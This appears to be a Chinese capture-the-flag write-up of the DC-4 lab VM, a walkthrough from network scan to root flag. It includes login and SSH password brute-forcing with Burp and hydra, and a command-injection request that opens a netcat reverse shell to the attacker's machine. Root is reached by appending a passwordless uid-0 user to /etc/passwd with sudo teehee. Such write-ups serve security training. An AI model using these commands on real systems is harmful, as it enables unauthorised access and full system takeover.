---
title: DC-4靶场练习
date: 2021-12-21 14:42:49
tags: DC靶场系列
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-kwm2r6_1920x1080.png
---

# DC-4靶场练习

## 环境

kali:192.168.10.128

dc-4:192.168.10.191(未知)

## 信息收集

先探测主机，发现靶机dc-4

```
nmap 192.168.10.0/24     
```

![image-20211221145649437](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221145649437.png)

靶机IP为192.168.10.191,开放了22和80端口

经过dc-2的教训，查看作者是否还隐藏了其他端口

```
nmap -A -p 1-65535 192.168.10.191
```

![image-20211221150338413](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150338413.png)

就两个开放的端口

打开web端，只有一个简单的登录界面

![image-20211221150531843](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150531843.png)

根据`Admin Information Systems Login`提示，这里是让我们用admin登录

## 弱口令爆破

Username:admin,Password:随便填，点击Submit，用burpsuite抓包进行密码爆破

![image-20211221151139798](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151139798.png)

密码字典我随便用一个，经过一段时间，密码爆破出来了

![image-20211221151312035](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151312035.png)

密码为happy

尝试登录：

![image-20211221151458491](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151458491.png)

登录成功

## 命令执行

登录成功后，点击Command ,发现这里是执行命令的页面

![image-20211221151713181](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151713181.png)

用burpsuite进行抓包重放

![image-20211221151957608](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151957608.png)

可以发现这里的命令，空格用`+`号代替了

尝试更改使用其他命令，看看这里能否执行:

这里我把命令改为了`id`

![image-20211221152213986](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152213986.png)

![image-20211221152231154](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152231154.png)

可以看到命令执行了

尝试反弹shell

```
kali：nc -lvvp 1234
```

http请求包处的命令改为：

```
radio=nc+-e+/bin/bash+192.168.10.128+1234&submit=Run
```

![image-20211221152801725](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152801725.png)

![image-20211221152824248](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152824248.png)

可以看到反弹shell成功

为了控制台好看一丢丢,输入下面的命令

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20211221153039086](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153039086.png)

## 寻找有用的信息

在/home 目录下发现了charles  jim  sam这三个目录

但是只有jim目录有东西

![image-20211221153534277](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153534277.png)

在backups目录下看到了个old-password.bak,打开一看，是个密码字典

![image-20211221154021780](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154021780.png)

先保存下来，命名为old-password.txt

![image-20211221153948338](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153948338.png)

查看下一个文件

```
cat mbox
```

![image-20211221154236304](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154236304.png)

发现没有权限

先不管它，看看test.sh

```
cat test.sh
```

![image-20211221154428348](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154428348.png)

没啥有用的信息，但是这好像是个提示

## 对22端口下手

我们还有个端口没有用到，22端口，ssh连接

连接条件是，需要用户名和密码。刚刚再/home目录下的三个目录名charles  jim  sam，应该就是存在的用户名，只有jim文件夹下有东西，ssh连接使用的用户名可以确定用的是jim，密码应该用的是

old-password.bak中的其中一个

所以，这里用hydra对ssh的密码进行爆破

```
hydra -l jim -P old-password.txt 192.168.10.191 ssh -v  
```

> -l 指定用户名,
>
> -P  指定密码字典
>
> -v 现实详细的执行过程

![image-20211221160053255](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221160053255.png)

密码爆破出来了，为jibril04

ssh连接

```
ssh jim@192.168.10.191
密码：jibril04
```

![image-20211221183312896](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221183312896.png)

连接成功



查看mbox,发现是发给jim的一封邮件的一些描述

![image-20211221214637420](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214637420.png)

去/var/mail查看邮件

![image-20211221214809599](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214809599.png)

在这可以看到有charles 的密码`^xHhA&hvim0y`

## 提权

切换用户

```
su charles
```

![image-20211221215116931](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221215116931.png)

切换成功！

尝试sudo提权

```
sudo -l
```

![image-20211221220600021](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221220600021.png)

发现该用户有一个root权限的命令:teehee

> teehee命令可以写入文件内容并不覆盖文件原有内容
>
> 使用teehee命令将一个无密码用户admin写入到/etc/passwd文件，并加入到root组中
>
> 格式:   
>
> 用户名:是否有密码保护(x即有保护):uid:gid:全称:home目录:/bin/bash

用该命令提权

```
echo "hacker::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

追加并提权成功

![image-20211221222914878](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221222914878.png)



## 找flag

按照dc-4之前的靶机，最后的flag都是在root文件夹下的

不出所料啊，在root文件夹下找到flag

![image-20211221223627254](https://raw.githubusercontent.com/todis21/image/main/img/image-20211221223627254.png)

